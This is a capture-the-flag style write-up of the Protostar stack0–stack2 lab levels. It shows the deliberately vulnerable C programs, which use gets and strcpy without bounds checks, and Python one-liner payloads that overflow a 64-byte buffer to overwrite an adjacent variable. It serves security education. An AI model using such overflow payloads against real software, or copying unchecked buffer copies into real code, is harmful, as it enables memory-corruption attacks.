# Stack0 

# Description 

>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

# Source Code 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
From the source code, we can see the main function has an integer variable called `modified` with value 0 and a buffer with 64 byte length.

It uses `gets` to write our input to that buffer, gets is dangerous because it doesn't check the input size.

So if we write more than 64 byte to that buffer, it will start overwriting the modifierd variable value.

# Solution 
```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64 +"BBBB" ' | ./stack0
you have changed the 'modified' variable

```

# Stack1 
# Description 

>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

# Source Code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}

```
it's similar to stack0 but it uses `strcpy` which is dangerous because it doesn't check if the source size is greater than destination size.

strcpy copies the first argument into the buffer, and we need to overwrite the modified varaible with `0x61626364` so we also need 64 byte for the buffer plus `\x64\x63\x62\x61` 


# Solution 

```
user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "A"*64 +"\x64\x63\x62\x61"'`
you have correctly got the variable to the right value

```

# Stack2 

# Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
This time, strcpy copies the data stored in an envirnoment variable called `GREENIE` to the buffer, and we need to overwrite the modidied varaible value with `0x0d0a0d0a`.

The buffer length is 64 byte, so we need a 64 byte plus the value that overwrite the modified variable.

we need to create that GREENIE variables, assigns this value to it.

# Solution

```
user@protostar:/opt/protostar/bin$ GREENIE=`python -c 'print "A"*64 +"\x0a\x0d\x0a\x0d"'`
user@protostar:/opt/protostar/bin$ export GREENIE
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable

```
